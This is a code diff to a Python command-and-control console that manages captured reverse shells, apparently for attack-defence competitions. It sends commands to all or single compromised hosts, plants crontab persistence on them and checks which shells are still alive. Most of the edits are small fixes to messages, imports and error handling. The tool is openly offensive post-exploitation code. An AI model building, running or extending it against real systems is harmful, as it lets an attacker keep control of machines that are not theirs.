@@ -1,11 +1,9 @@
 import json
 import random
 import socket
-import string
 import threading
 import time
-from base64 import b64encode
-from hashlib import sha1
+import traceback
 
 lootedShell = {}
 
@@ -46,7 +44,7 @@ def recv(sck, addr):
     host = addr[0]
     port = addr[1]
     try:
-        while True:        
+        while True:
             lootedShell[host][port]["history"].extend(sck.recv(1024))
             lootedShell[host][port]["time"] = time.time()
     except Exception:
@@ -90,13 +88,13 @@ def sendwe(cmd):
 def sendsp(mixed):
     mixed = mixed.lstrip()
     if mixed.find(' ') == -1:
-        print(f"[*] Please input right format using `sendsp [host] [cmd]`")
+        print("[-] Please input right format using `sendsp [host] [cmd]`")
         return
     pos = mixed.find(' ')
     host = mixed[:pos]
     cmd = mixed[pos:]
     if not host in lootedShell:
-        print(f"[*] Host {host} not found")
+        print(f"[-] Host {host} not found")
         return
     print(f"[*] Sending {cmd} to {host}")
     cmd += "\n"
@@ -106,7 +104,6 @@ def sendsp(mixed):
 
 def cron(placeholder):
     # 尝试用 crontab 持久化, 可以再开一个专门的端口来接
-    
     cmdFinal = "echo -e \""
     for cmd in CRONTAB:
         cmdFinal += cmd
@@ -165,11 +162,11 @@ def flush(filename):
 
 def verify(placeholder):
     verifyStr = "###"
-    for i in range(10):   
+    for _ in range(10):   
         verifyStr += str(random.randint(0, 9999))
         verifyStr += "###"
-    tmp = "\"" + verifyStr[0] + "\"\"" + verifyStr[1:] + "\""
-    send(f"echo {tmp}")
+    tmp = "echo \"" + verifyStr[0] + "\"\"" + verifyStr[1:] + "\""
+    send(tmp)
     print(f"[*] Wait {TIME_WAIT_VERIFY} second for verify...")
     time.sleep(TIME_WAIT_VERIFY)
     print(f"[*] Now staring verify")
@@ -180,7 +177,7 @@ def verify(placeholder):
     flush("")
 
 
-def help():
+def help(placeholder):
     print("[*] Help:")
     print("[1] exec [cmd]")
     print("    Command after exec will be send to all shells")
@@ -196,7 +193,7 @@ def help():
     print("    Dump all result to file")
     print("[7] flush (filename)")
     print("    Dump all result and flush died shells and history")
-    print("[7] verify")
+    print("[8] verify")
     print("    Verify shells with echo")
 
 
@@ -211,17 +208,22 @@ def main(lport):
         "info": info,
         "dump": dump,
         "flush": flush,
-        "verify": verify
+        "verify": verify,
+        "help": help,
+        "?": help
     }
     while True:
         try:
             i = input(">>> ").strip()
             choice = i.split(" ")[0]
             if choice in mapping:
-                mapping[choice](i[len(choice) + 1:]) # 将命令后面的传给函数作为参数
+                try:
+                    mapping[choice](i[len(choice) + 1:])  # 将命令后面的传给函数作为参数
+                except Exception:
+                    traceback.print_exc()
             else:
                 if len(i) != 0:
-                    help()
+                    print("[-] Invalid command, use 'help' to get more information")
         except (KeyboardInterrupt, EOFError):
             while True:
                 try:
